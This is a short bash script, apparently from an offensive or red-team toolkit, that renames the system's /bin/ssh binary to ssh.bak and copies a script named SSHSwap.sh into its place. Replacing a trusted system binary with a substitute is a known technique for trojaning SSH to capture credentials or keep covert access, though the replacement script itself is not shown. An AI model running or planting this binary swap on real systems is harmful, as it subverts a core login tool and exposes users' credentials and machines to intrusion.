#!/bin/bash
if [ -e "/bin/ssh" ]; then
    mv /bin/ssh /bin/ssh.bak
    cp Linux/BianarySwapping/SSHSwap.sh /bin/ssh
else
    echo "Bianary not present on system."
fi

